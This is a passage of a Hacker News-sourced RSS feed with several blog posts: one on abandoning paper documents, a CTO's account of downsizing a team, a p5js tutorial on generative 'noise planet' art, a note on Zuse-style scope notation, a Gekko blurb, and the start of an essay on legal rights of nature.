<p>Of course there  are still many uses and reasons for producing completed and immutable read-only text, but that, like digital signatures, is better achieved through cryptography than through pretending that the rules of the physical world still apply. There are even for reasons for producing pages – who doesn’t like a physical print-out, or a <a href="https://tex.stackexchange.com/questions/1319/showcase-of-beautiful-typography-done-in-tex-friends">beautiful page</a>, every now and then? But this should not be the default form of the document. As pure computer-readable data, documents are alive and infinitely malleable. As printed glyphs on bits of dead tree, they are dead and inert, useful only to humans, and in limited ways.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>
<p>In this, the third decade of the 21st century, let us leave behind the paper document. For how can we possibly hope to <a href="https://en.wikipedia.org/wiki/Technological_singularity">digitise our brains</a> if we cannot first digitise their transpositions?</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>This becomes particularly apparent when technical information, such as API references or tabular data, are distributed in PDF form. Forcing this kind of information into paper document form can inflict <a href="https://davidyat.es/2020/03/21/dumb-smart-quotes/">still further indignities</a>. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
</ol>
</section>

    </section>
    </article>
  </div></div>]]>
            </description>
            <link>https://davidyat.es/2021/01/10/death-to-the-document/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712829</guid>
            <pubDate>Sun, 10 Jan 2021 09:35:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[CTO day 2: downsizing the team]]>
            </title>
            <description>
<![CDATA[
Score 94 | Comments 106 (<a href="https://news.ycombinator.com/item?id=25712771">thread link</a>) | @delebe
<br/>
January 10, 2021 | https://danlebrero.com/2020/12/02/cto-diary-downsizing-team-firing/ | <a href="https://web.archive.org/web/*/https://danlebrero.com/2020/12/02/cto-diary-downsizing-team-firing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p id="entry-summary">On your first day as newly appointed CTO you are working on your hiring strategy, the second day your organization asks you to downsize the team.</p><div><p>A very important project that was a done deal, and that will secure the organization’s future for the next five years, failed to happen.</p><p>Not winning this project meant that the organization was forced to <em>“focus”</em> and reduce costs.</p><p>It never crossed my mind that one of the first things that I would be asked to do as an inexperienced CTO would be to fire part of the team.</p>
<p>when such bad news becomes public, host an open door day where the team can openly talk about the situation, share their feelings, see each other, feel connected, and be listened to. It would not stop the gossiping but it will help.</p><h2>Cuts and team principles</h2><p>The Dev team slice of the <em>“focus”</em> meant cutting cost by 10 to 15%. In human terms, firing two to four people (out of 17).</p><p>After some failed attempts to approach this task, this is what worked for me.</p><p>I started by listing some principles: </p>
<ul>
  <li>For each product, we need to cover the following disciplines: Frontend, Backend, Architecture, Operations, Mobile, UX, Design, QA, Leadership, and Product Management.</li>
  <li>There are broadly 3 experience levels:
  <ul>
    <li>Senior: creates the plan.</li>
    <li>Mid-level: follows the plan.</li>
    <li>Junior: needs to be taught to follow the plan.</li>
  </ul></li>
  <li>No number of junior people can do some work a senior person can do.</li>
  <li>Not having a senior person in a discipline will mean that the product quality will suffer:
  <ul>
    <li>If a senior creates a plan, a team of mid-level+juniors can follow the plan for some time (2-3 years?) before the product becomes a big mess.</li>
    <li>To get out of a big mess, we need senior people.
    <ul>
      <li>We are already in a big mess with Product A and Product B.</li>
      <li>With the current team, it feels Product A is getting out of the mess.</li>
    </ul></li>
  </ul></li>
  <li>Independent (cross-functional) teams are more efficient:
  <ul>
    <li>More focus.</li>
    <li>No handoffs, faster feedback.</li>
    <li>No shared “resource” contention.</li>
  </ul></li>
  <li>People working in multiple products/teams are less efficient.</li>
  <li>Multidisciplinary (generalist) people:
  <ul>
    <li>Can cover the need for several of the disciplines.</li>
    <li>They can be junior in one discipline and senior in another.</li>
    <li>Allow focusing on any priority, without creating artificially important work for single-disciplined members.</li>
  </ul></li>
  <li>Max team size: 2 pizza teams 6-8.</li>
</ul><p>The ideal team would be one that has all disciplines covered at a senior level with multidisciplinary people working in just one team, and with enough overlap to avoid a <a href="https://en.wikipedia.org/wiki/Bus_factor">bus factor</a> of one. Additional people will bring additional capacity.</p><h2>Inverse Conway’s maneuver</h2><p>We have been working on bringing three of the products together for some time. They were already under the same product manager, but they were still three teams working on their own priorities. Merging them into one team, in a classic <a href="https://danlebrero.com/2020/01/08/do-i-need-a-gateway-api-team-dynamics/#content">inverse Conway’s maneuver</a> would hopefully accelerate the integration between the products.</p><p>One of the other products was small enough that for this task I decided to temporarily ignore it.</p><p>Following the principles above and the product considerations, the plan was to move the previous team setup from:</p><p><img src="https://danlebrero.com/images/blog/cto/day2/old-team-structure.jpg" alt="old team structure"> </p><p>To something like (boxes represent skills, not people):</p><p><img src="https://danlebrero.com/images/blog/cto/day2/new-team-structure.jpg" alt="new team structure"> </p><p>So two products, two cross-functional teams. Platforms and design teams will be reshuffled inside those two teams.</p><h2>Which parent do you love most? A computer will tell</h2><p>With a clear plan for the team, the next step was to <em>“just”</em> pick up who will work on each team, and who we will need to let go. The most painful decision in my career. </p>
<blockquote><p><a href="https://danlebrero.com/2019/11/27/becoming-a-technical-leader-book-notes/#content">People with a strong technical background can convert any task into a technical task, thus avoiding work they don’t want to do.</a> <cite>Jerry Weinberg, Becoming a Technical Leader</cite></p>
</blockquote><p>And I didn’t want to do the task so, consciously ignoring Mr. Weinberg, I transformed the ordeal into an optimization problem, for which I wrote an application to help me with.</p><h3>The app</h3><p>The application took as input the amount of $$$ to cut, the list of people, their salary, and the skill level on each discipline mentioned above, and outputted the possible two teams that would be within budget and match the minimum requirements, sorted by a scoring system.</p><p>The minimum requirements and scoring system configuration looked like:</p>
<pre><code>{
"FE" [at-least-senior sum-skills]
"PM" [senior-plus-somebody-else (fix-points 5)]
"Design" [two-mid-or-senior (senior-better 6 2)]
...
}
</code></pre><p>The first function filters out invalid teams while the second scores the valid ones.</p><p>In the example we say that the team has to have:</p>
<ul>
  <li>At least one senior FE developer. The more FE developers, the better team score.</li>
  <li>At least one senior product manager and one mid or junior one. Only one senior is not enough. No matter how many PMs the team has, the score for this discipline is 5. A team with loads of FE devs will score higher than one with loads of PMs.</li>
  <li>At least a senior designer or two mid-level designers, but we prefer one senior designer (6 points) instead of two mid-level ones (2 points).</li>
</ul><h3>The result</h3><p>As heartless as this may seem:</p>
<ul>
  <li>It removed some bias. There is still bias on the skill level evaluation and in the team scoring system.</li>
  <li>I was part of the people on that list. To be honest, little consolation here. Big bias.</li>
  <li>It forced me to be very very precise on what a “functioning team” meant.</li>
  <li>It allowed me to see what different scoring systems would output.</li>
  <li>I noticed some people would never show in the output, and had to dig into why. It was enlightening.</li>
  <li>It allowed me to analyze tens of thousands of different team combinations, with different scoring systems.</li>
  <li>Programming gave me a respite from the task. This was the first time, but now I embrace more regularly “keep my sanity” programming days.</li>
</ul><p>Most important, the application gave me a few starting points. Of those, I still had to consider the team dynamics, existing teams, personalities, seniority, potential, personal situation, future needs, …</p>
<p>yes, I still have the code. No, I am not going to share it publicly. It would kill me to find there is a bug.</p><h2>Delivering the bad news</h2><p>Once the decision was made, it was time to swallow the last bitter pill.</p><p>Some tips:</p>
<ul>
  <li>Ensure that the people affected are the first ones to know.</li>
  <li>Warn beforehand:
  <ul>
    <li>Do not use your regular one-to-one meeting slot.</li>
    <li>In your message, give a strong hint: “HR person will be in the meeting”, “Really bad news”.</li>
    <li>Give them time to get ready for the meeting.</li>
  </ul></li>
  <li>You don’t need to do it alone. Our HR manager was present and was a huge support for both of us.</li>
  <li>Treat people like adults.</li>
  <li>At the meeting, follow Nadia van der Vlies’ <a href="https://danlebrero.com/2020/04/01/no-nonsense-leadership-summary/#bad-news">advice</a>:
  <ul>
    <li>Deliver the blow:
    <ul>
      <li>Go straight to the bad news.</li>
      <li>Give one or two reasons.</li>
    </ul></li>
    <li>Manage the reaction:
    <ul>
      <li>Be understanding. Do not justify yourself.</li>
      <li>Give space. Do not fill silences.</li>
    </ul></li>
    <li>Solution, explanation, follow-up appointment:
    <ul>
      <li>Wait for the employee to be ready. When she starts asking “why” or “what now”.</li>
      <li>Reiterate reasons.</li>
    </ul></li>
  </ul></li>
  <li>In a couple of days follow up with another more informal meeting. The news would have sunk, and the conversation would be more forward-thinking and productive.</li>
</ul>
<hr><p>A slap in the face to awaken me from the dream that a CTO role is mostly about technology.</p></div></div>]]>
            </description>
            <link>https://danlebrero.com/2020/12/02/cto-diary-downsizing-team-firing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712771</guid>
            <pubDate>Sun, 10 Jan 2021 09:27:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Noise Planets]]>
            </title>
            <description>
<![CDATA[
Score 153 | Comments 16 (<a href="https://news.ycombinator.com/item?id=25712767">thread link</a>) | @atulvi
<br/>
January 10, 2021 | https://avinayak.github.io/art/2021/01/09/noise-planets.html | <a href="https://web.archive.org/web/*/https://avinayak.github.io/art/2021/01/09/noise-planets.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><img src="https://avinayak.github.io/uploads/erporydxmaarwcd.png" alt=""></p>

<p>I recently found this piece of art (LINES 2A (2017)) created by <a href="https://twitter.com/tylerxhobbs">Tyler Hobbs</a>. This picture kinda looked very hand drawn, but it’s completely generative. Something about this drawing and it’s texture kind of resonated with me, so I wanted to try to study and replicate (or make something inspired by this work) using p5js.</p>

<p>I started out by plotting a bunch of random points within a circle like so.</p>

<div><div><pre><code>w = 1000
function setup() {
  createCanvas(w, w);
  background('#F9F8F4');
}

function draw() {
  x = random(w)
  y = random(w)
  if (pow(w/2 - x, 2) + pow(w/2 - y, 2) &lt; 7e4) {
    point(x,y)
  }
}
</code></pre></div></div>

<p><img src="https://avinayak.github.io/uploads/download-25.png" alt=""></p>

<p>This is a painfully slow process to generate random points in a circle. I found a better way to do this later. What I wanted to do next was to generate flow fields, but restricted to the circular region.</p>

<p>It’s super easy to generate flow field patterns using perlin noise.</p>

<ol>
  <li>Choose a random point <code>&lt;x,y&gt;</code></li>
  <li>Plot <code>&lt;x,y&gt;</code></li>
  <li>Calculate <code>n = noise(x,y)</code></li>
  <li>Do <code>x+=cos(n * 2 * PI)</code> and <code>y+=sin(n * 2 * PI)</code></li>
  <li>Repeat 2.</li>
</ol>

<p>We’re going to plot flow fields inside the circle. Let’s try this.</p>

<div><div><pre><code>const is_in_circle = (x, y) =&gt; 
  (pow(w / 2 - x, 2) + pow(w / 2 - y, 2) &lt; 7e4)

function draw() {
  if (is_in_circle(x = random(w), y = random(w)))
    while (is_in_circle(x, y)) {
      n = noise(x, y)
      x += sin(n * TAU)
      y += cos(n * TAU)
      point(x, y)
    }
}
</code></pre></div></div>

<p><img src="https://avinayak.github.io/uploads/download-28.png" alt=""></p>

<p>OK, not very good. The noise at this level is pretty rough. we’re going to zoom in to the noise function (by dividing the <code>x,y</code> inputs by some constant value) and probably use <code>circle(x ,y ,0.3)</code> to plot points instead if point function, because I feel it looks way smoother. Also, I’m adding a <code>random() &gt; 0.01</code> condition in the loop so that we also get short lines that are not trimmed away by the edge of the circle.</p>

<div><div><pre><code>function draw() {
  if (is_in_circle(x = random(w), y = random(w)))
    while (is_in_circle(x, y) &amp;&amp; random() &gt; 0.01) {
      n = noise(x / 500, y / 500)
      x += sin(n * TAU)
      y += cos(n * TAU)
      circle(x, y, .3)
    }
}
</code></pre></div></div>

<p><img src="https://avinayak.github.io/uploads/download-27.png" alt=""></p>

<p>Actually.. not bad. I think we manage almost replicate the original texture. The inverted version also looks pretty good.</p>

<p><img src="https://avinayak.github.io/uploads/download-19.png" alt=""></p>

<p><img src="https://avinayak.github.io/uploads/ppanets.png" alt=""></p>

<p>I went ahead and made a つぶやきProcessing version of this.</p>

<blockquote><p lang="en" dir="ltr">function setup(){createCanvas(w=1e3,w),background("<a href="https://twitter.com/hashtag/%E3%81%A4%E3%81%B6%E3%82%84%E3%81%8DProcessing?src=hash&amp;ref_src=twsrc%5Etfw">#つぶやきProcessing</a>")}function draw(){if(g(x=random(w),y=random(w)))for(;g(x,y)&amp;&amp;random()&gt;.01;)n=noise(x/500,y/500),x+=sin(n_TAU),y+=cos(n_TAU),circle(x,y,.3)}g=((n,o)=&gt;pow(w/2-n,2)+pow(w/2-o,2)&lt;w*w/16); <a href="https://t.co/iVZTMtCn3i">pic.twitter.com/iVZTMtCn3i</a></p>— yakinavault (@yakinavault) <a href="https://twitter.com/yakinavault/status/1347903013042622467?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote>


<h2 id="going-further-animations">Going Further: Animations</h2>

<p>The code we wrote right now technically is animated. The animation however is not very smooth.</p>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_03-52-31.mp4" type="video/mp4"> </video>

<p>To make smooth animations, we need to generate new points in the circle, keep track of these points outside the <code>draw()</code> function. I found this neat <a href="https://stackoverflow.com/a/50746409">technique</a>, to find random points in a circle where a random radius <code>r</code> and angle <code>theta</code> are chosen and the <code>x,y</code> points are obtained as <code>x = centerX + r * cos(theta)</code> and <code>y = centerY + r * sin(theta)</code></p>

<p>Let’s try that first.</p>

<div><div><pre><code>function random_point() {
  r = random(w / 4)
  t = random(TAU)
  return [
    w/2 + cos(t) * r, 
    w/2 + sin(t) * r
  ]
}

function setup() {
  createCanvas((w = 1e3), w);
  background(255)
  k = w / 2
  m = (Array(w).fill(0)).map(random_point)
}

function draw() {
  for (i = k; --i;) {
    [x, y] = m[i]
    circle(x, y, .3);
  }
}
</code></pre></div></div>

<p><img src="https://avinayak.github.io/uploads/screenshot-from-2021-01-10-04-51-20.png" alt=""></p>

<p>and now we apply flow fields and try to move these points.</p>

<div><div><pre><code>function random_point() {
  r = random(w / 4)
  t = random(TAU)
  return [
    w/2 + cos(t) * r, 
    w/2 + sin(t) * r
  ]
}

const w = 1000
function setup() {
  createCanvas(w, w);
  background('#F9F8F4')
  k = w / 2
  points = (Array(k).fill(0)).map(random_point)
}

function draw() {
  for (i = k; --i;) {
    [x, y] = m[i]
    x += sin(n = noise(x / 400, y / 400) * TAU) * h
    y += cos(n) * h
    stroke(i%255)
    circle(x, y,.3)
    if (pow(k - x, 2) + pow(k - y, 2) &lt; 7e4)  // if point is in circle
      points[i] = [x, y, t]
    else points[i] = random_point() // replace with new point if not
  }
}
</code></pre></div></div>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_04-56-11.mp4" type="video/mp4"> </video>

<p>And a つぶやきProcessing version of course..</p>

<blockquote><p lang="cy" dir="ltr">t=0,p=i=&gt;\[k+(r=random(w/4))_cos(t+=.1),k+r_sin(t)\],setup=i=&gt;{createCanvas(w=1e3,w),m=Array(k=w/2).fill(0).map(p)},draw=r=&gt;{for(i=k;--i;)\[x,y\]=m\[i\],x+=sin(n=noise(x/k,y/k)_TAU),y+=cos(n),stroke(i%4_85),point(x,y),k_w+x_x+y_y-w_(x+y)&lt;7e4?m\[i\]=\[x,y\]:m\[i\]=p()};//<a href="https://twitter.com/hashtag/%E3%81%A4%E3%81%B6%E3%82%84%E3%81%8DProcessing?src=hash&amp;ref_src=twsrc%5Etfw">#つぶやきProcessing</a> <a href="https://t.co/xVhCBNUltL">pic.twitter.com/xVhCBNUltL</a></p>— yakinavault (@yakinavault) <a href="https://twitter.com/yakinavault/status/1347930637227855874?ref_src=twsrc%5Etfw">January 9, 2021</a></blockquote>


<h2 id="adding-colors">Adding Colors</h2>

<p>There are many strategies to colorizing this sketch. One is by just giving each particle a random initial color.</p>

<p><img src="https://avinayak.github.io/uploads/download-21.png" alt=""></p>

<p>However, I found that maintaining the initial x or y position in the particle array and using that to derive the hue information gives us some nice Jupiter/gaseous planet vibes.</p>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_05-18-19.mp4" type="video/mp4"> </video>

<p>The fringing at the sides can be avoided by moving 50% of the points in the reverse direction.</p>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_05-28-03.mp4" type="video/mp4"> </video>

<video loop="" autoplay="" muted=""> <source src="https://avinayak.github.io/uploads/simplescreenrecorder-2021-01-10_08-43-25.mp4" type="video/mp4"> </video>

<p>More color variations</p>

<p><img src="https://avinayak.github.io/uploads/untitled.png" alt=""></p>

<p>And that’s it. Hope this was educational!</p>

</div></div>]]>
            </description>
            <link>https://avinayak.github.io/art/2021/01/09/noise-planets.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712767</guid>
            <pubDate>Sun, 10 Jan 2021 09:26:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Blocks Courtesy of Konrad Zuse (2014)]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25712727">thread link</a>) | @todsacerdoti
<br/>
January 10, 2021 | https://journal.infinitenegativeutility.com/blocks-courtesy-of-konrad-zuse | <a href="https://web.archive.org/web/*/https://journal.infinitenegativeutility.com/blocks-courtesy-of-konrad-zuse">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Apparently, I've got a theme going of Weird Syntax. Let's run with it.</p>

<p>Konrad Zuse was an early pioneer in computer science, although his name is perhaps somewhat less well-known than others. Zuse holds the honor of having built the first programmable computer—-the Z3—-back in the 40's, as well as several other computing firsts<sup id="fnref:1"><a href="#fn:1" rel="nofollow">1</a></sup>. Of particular interest to this blog post is his early unimplemented programming language, Plankalkül.</p>

<p>Plankalkül was, like the Z3, in many respects ahead of its time. Zuse's explicit goal was to be able to describe programs at a high level, which meant he included control structures and datatype definitions<sup id="fnref:2"><a href="#fn:2" rel="nofollow">2</a></sup> and other high-level constructs that were often missing in languages of the early years of computing. Zuse was working on Plankalkül at a time when his machines were not useable, which meant that his language work was more theoretical than it was technical, and consequently he allowed features that he wasn't entirely sure how to program. Despite his notes on it having been written in the mid-40's, they were not published until the 70's, and it was not implemented until the year 2000.</p>

<p>One thing that struck me, as I read programs in this notation that had been set down on a typewriter<sup id="fnref:3"><a href="#fn:3" rel="nofollow">3</a></sup>, is that certain kinds of grouping were handled by explicit indication of scope: not via matched delimiters as in ALGOL-style languages, or via indentation in languages such as Python and Haskell, but by formatting the code so that a line bordered on the left of the scoped parts of the code:</p>

<p><img src="https://blog.infinitenegativeutility.com/static/zuse-01.png" alt=""></p>

<p>This is meant to capture the way grouping works in the hand-written or typeset notation, with brackets spanning multiple lines:</p>

<p><img src="https://blog.infinitenegativeutility.com/static/zuse-02.png" alt=""></p>

<p>I think this is notationally interesting: it's like Python's significant whitespace, but not, uh, whitespace. It would be incredibly tedious to type out, but still entirely compatible with current programming notation:</p>

<pre><code>class Tet
 | @staticmethod
 | def new_tet()
 |  | n = randint(0, len(Tet.Tets) - 1)
 |  | for p in Tet.Tets[n]
 |  |  | if p in Board.permanent
 |  |  |  | Game.lose()
 |  | Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 |
 | def __init__(self, points, color)
 |  | self.points = points
 |  | self.color = color
</code></pre>

<p>and would be entirely amenable to beautifying via judicious application of Unicode:</p>

<pre><code>class Tet
 ┃ @staticmethod
 ┃ def new_tet()
 ┃  ┃ n = randint(0, len(Tet.Tets) - 1)
 ┃  ┃ for p in Tet.Tets[n]
 ┃  ┃  ┃ if p in Board.permanent
 ┃  ┃  ┗  ┗ Game.lose()
 ┃  ┗ Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 ┃
 ┃ def __init__(self, points, color)
 ┃  ┃ self.points = points
 ┃  ┗ self.color = color
</code></pre>

<p>Looking at this notation, however, an interesting possibility struck me: a programmer could explicit annotate information about the <em>kind of scope</em> involved in a given line. In this Python-like example, I could, for example, distinguish class scope using double lines, function scope with thick lines, and control structure scope with thin lines:</p>

<pre><code>class Tet
 ║ @staticmethod
 ║ def new_tet()
 ║  ┃ n = randint(0, len(Tet.Tets) - 1)
 ║  ┃ for p in Tet.Tets[n]
 ║  ┃  │ if p in Board.permanent
 ║  ┃  └  └ Game.lose()
 ║  ┗ Game.current = Tet(Tet.Tets[n], Tet.TetColors[n])
 ║
 ║ def __init__(self, points, color)
 ║  ┃ self.points = points
 ║  ┗ self.color = color
</code></pre>

<p>One advantage of this scheme is that a handful of lines, viewed in isolation, still give you a clear view of what surrounds them. For example, I can view these two lines in isolation and still tell that they are within a control structure used within a function declared within a class:</p>

<pre><code> ║  ┃  │ if p in Board.permanent
 ║  ┃  └  └ Game.lose()
</code></pre>

<p>You could also imagine a hypothetical language in which choice of scope delimiter is important. In Python, <code>for</code> and <code>if</code> do not form a new lexical scope. What if instead we could stipulate the kind of scope they form by this notational convention?</p>

<pre><code>def okay()
 ┃ if True
 ┃  └ n = 5   # n is declared in function scope
 ┗ return n   # n leaks out of the if-scope

def not_okay()
 ┃ if True
 ┃  ┗ n = 5   # n is declared in the if's scope
 ┗ return n   # error: no n in scope here
</code></pre>

<p>That being said, there are a number of reasons that this notation is in inferior to existing notations:</p>
<ul><li>It makes refactoring code <em>much</em> more difficult.</li>
<li>It requires that the programmer <em>pay attention</em> to the sequence of enclosing scopes on a <em>line-by-line</em> basis, which is generally too pedantic and not particularly useful for a programmer.</li>
<li>The ability to select “which kind of scope” is by no means only expressible by this notation, as other syntactic features such as keywords and delimiters could express the same thing.</li>
<li>There are only so many line-like characters which can serve as a scope marker, so this scheme is not very extensible.</li>
<li>It complicates parsing (especially by introducing an entirely new class of parse errors in which adjacent lines feature incompatible sequences of delimiting lines), and so it also...</li>
<li>Complicates parse <em>error messages</em>, which are an important part of a language's UI and should be considered seriously.</li></ul>

<p>So, as in my previous post on <a href="https://journal.infinitenegativeutility.com/2014/8/noun-case" rel="nofollow">grammatical case in programming languages</a>, I urge readers <em>not</em> to use this notation as the concrete syntax for a programming language. This is merely an entertaining peek through the looking glass at a curious notational convention which was never adopted.</p>

<p>That said: this makes a very nice notation for <em>viewing</em> code, where the programmer does not have to explicitly draw ASCII art around their code; indeed, it bears more than a passing similarity to the graphical interface used in <a href="http://scratch.mit.edu/" rel="nofollow">Scratch</a>, and Sean McDirmid's <a href="http://research.microsoft.com/en-us/projects/liveprogramming/typography.aspx" rel="nofollow">Experiments in Code Typography</a> features this very convention as an interactive ornament on code in a Python-like language.</p>

</div></div>]]>
            </description>
            <link>https://journal.infinitenegativeutility.com/blocks-courtesy-of-konrad-zuse</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712727</guid>
            <pubDate>Sun, 10 Jan 2021 09:21:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Gekko: OS software used by the Danish gov. for economic forecasting]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712719">thread link</a>) | @stilisstuk
<br/>
January 10, 2021 | http://t-t.dk/gekko/ | <a href="https://web.archive.org/web/*/http://t-t.dk/gekko/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p>Instead of Gekko, why not use for instance Python, or R, or GAMS, or MATLAB, or SAS, or Excel, or … ?</p>
<p>Software packages are typically aimed at some purpose, and this is reflected in, among other things, the underlying data structures and the syntax of the command language.</p>
<p>Since Gekko is timeseries-oriented, the syntax for handling and analyzing timeseries and timeseries-based models is concise and natural. Gekko does not try to do everything, but tries to focus on its strong points, while simultaneously providing good interfaces to other software packages.</p>

			</div></div>]]>
            </description>
            <link>http://t-t.dk/gekko/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25712719</guid>
            <pubDate>Sun, 10 Jan 2021 09:20:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Humans Have Rights and So Should Nature]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25712528">thread link</a>) | @CapitalistCartr
<br/>
January 10, 2021 | http://m.nautil.us/issue/94/evolving/humans-have-rights-and-so-should-nature | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/94/evolving/humans-have-rights-and-so-should-nature">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>H</span>umans once lived in harmony with the natural world. Consider timekeeping. Until relatively recently, the human notion of time was based on the natural rhythms of nature. Time was measured by a new moon, the first snow, a migrating bird, or the ebb and flow of a river. Time meant situating ourselves as part of a larger web of life.</p><p>Western society has since lost its connection to nature. Human-created days, hours, minutes, seconds meticulously dictate our lives. Our sense of time is now detached from the world around us. Modern clocks provide many important services by establishing predictability in a complex and fast-paced world. But the loss of our interconnectivity with nature’s timekeepers has diminished our relationship with nature.</p><figure data-alt="Wilson_BREAKER"><img src="http://static.nautil.us/18075_0bbe3f9c489c409d1d6e229ccd23ab00.png" width="733" alt=""><figcaption><span><strong>OF TIME AND THE RIVER:</strong> The Anchorage Museum displays “Alaska River Time,” an art project by Jonathon Keats, which uses the natural flow of a river as a timekeeping standard. Keats’ project exemplifies the growing cultural awareness of our interrelationship with nature.</span><span>Courtesy of the Anchorage Museum</span></figcaption></figure><p>Timekeeping is not the only way in which we have lost touch with nature. Many elements of Western society treat humans as separate from and superior to the natural world. Nature was once perceived as living—even sacred. Now it is treated as a human commodity. Under Western legal systems, humans possess rights while the rest of nature does not. Entire cities have been built over once wondrous ecosystems that we sparsely acknowledge. Few people realize that entombed rivers still flow invisibly below cities such as New York, London, and Paris. Nature is still here, but it is often subjugated and ignored.<br></p><p>We can reclaim our deep relationship with nature, essential to solving the environmental crisis. It begins with two movements: cultural and legal. The cultural one arises from artists, writers, and other creatives whose work reshapes our thinking by underscoring that humans are part of nature, not separate from it. The legal one involves harmonizing human laws with the laws of the Earth. This means rewriting the legal system so it represents nature’s rights and interests directly alongside our own. A new generation of “Earth lawyers,” including me, have taken up this challenging task.</p><p><span>T</span>he illusion of separation between humans and nature began about 11,000 years ago, when the first agriculture-based societies emerged. From 800 to 300 B.C., philosophers and religions began to champion human superiority and dominion over nature. Scientists like Francis Bacon and philosophers like René Descartes popularized their conceptions of Earth as a machine or giant clock that was possible to control and exploit as long as we pulled the right levers.</p><p>Midway through the 18th century, the Industrial Revolution catalyzed the development of an economic system that viewed nature as a form of natural capital rather than a life source. New economic paradigms encouraged industry to incessantly exploit nature to fuel monetary growth without limits. Modern democracy and human rights also emerged during this period, but they focused on the well-being of individuals rather than the larger community of life. In accordance with the dominant systems of law and economics, society came to normalize the separation of humans and nature.</p><blockquote><p>The law establishes a legal duty for humans to protect and restore ecosystems to health because that is their right.</p> </blockquote><p>The next period, from post-World War II through the present, is sometimes called the “Great Acceleration.” Measures of human growth and impact, such as population, GDP, water and energy use, ocean acidification, and forest loss, began to increase nearly exponentially during this time.<sup>1</sup> New economic policies commodified nearly all aspects of life, including air, water, forests, countless plant and animal species, and food, among others. Corporations began to exploit unprotected ecosystems until they reached total collapse. Consumerism became a way of life.<br></p><p>We have killed off 68 percent of vertebrate animal populations over the last 50 years.<sup>2</sup> Nearly one in six species faces extinction due to climate change.<sup>3</sup> Humans felled 46 percent of all trees, as well as 20 percent of the Amazon in the last 50 years alone.<sup>4</sup> We destroyed half of the world’s coral reefs and are well on our way to a world where they are totally wiped out.<sup>5</sup> Humans suffer, as well, from the precipitous decline of nature. Some 7 million humans die each year due to air pollution, including 100,000 annually in the United States.<sup>6</sup>&nbsp;</p><p><span>A</span>lthough most of the world largely continues with business as usual, a growing number of governments have embraced cutting-edge legal solutions that would allow humans to live in harmony with nature.</p><p>One of the most promising legal solutions is “rights of nature.” It recognizes that nature is a “legal entity” or “persons” with fundamental rights. This movement received global attention when Ecuador recognized the rights of nature in its 2008 Constitution. Now, rights of nature is recognized in some 12 countries through a combination of national and local legislation, landmark court decisions, treaty agreements, and other legal developments.</p><div>
<article>
<p><a href="http://m.nautil.us/issue/15/Turbulence/toad-orgies-underwater-ac-and-other-stories-from-the-storm" data-trval="toad-orgies-underwater-ac-and-other-stories-from-the-storm" data-trlbl="foc_rec" data-tract="internal_art">
<img src="http://static.nautil.us/3812_40dba662fae60cd3bcceaa76a82d2873.png" alt="Sapolsky_TH-F1" width="314" height="177">
</a>
</p>


</article>
</div><p>Rights of nature corrects shortcomings of modern environmental laws. Environmental laws operate as a tourniquet, creating rules to prevent nature’s loss but doing little to address root causes—such as an economy that incentivizes the maximum exploitation of nature for profit. By contrast, rights of nature establishes a legal duty for humans to protect and restore ecosystems to health because that is their right.</p><p>The rights of nature, although still in its early stages, is gaining momentum. In 2017, the Constitutional Court of Colombia declared the Atrato River—one of Colombia’s largest rivers—to be a “subject of rights,” with rights to protection, conservation, maintenance, and restoration. The Court also created a guardianship body to serve as the voice of the river, just as a child might have a legal guardian. Finally, the Court ordered state authorities to create a plan—a blueprint is in the works—to decontaminate waterways in the Atrato River basin, to end illegal mining, and take other actions to uphold the rights of rivers.</p><blockquote><p>Two forces, law and culture, will converge to create transformative change. In the meantime, go meet your local river.</p> </blockquote><p>In New Zealand, the Te Awa Tupua (Whanganui River Claims Settlement) Act 2017 recognized the Whanganui River as a living entity and legal person, solidifying a 2012 treaty agreement between the Whanganui Iwi (a Maori tribe) and New Zealand’s crown government. It establishes a guardianship body to promote the river’s health and well-being and serve as its “human face.” Already, the legislation is being put into practice. In 2020, a new governance structure for a port revitalization project on the Whanganui River announced that the river’s indivisible nature and the community’s collective obligation to benefit the river will guide its decision-making.<sup>7</sup><br></p><p>There are other instances of ecosystems being recognized as having rights or personhood. In 2019, the highest court in Bangladesh recognized the rights of all rivers and instituted a plan to address illegal river encroachment. In the United States, the Klamath and Snake Rivers are recognized as having rights by the Yurok and Nez Perce Tribes, respectively. In Mexico, three states have amended their constitutions to recognize the rights of nature, and lawmakers in Oaxaca, Mexico, are proposing to establish the rights of rivers and create a robust legal guardianship body for implementation.</p><p>Granting legal 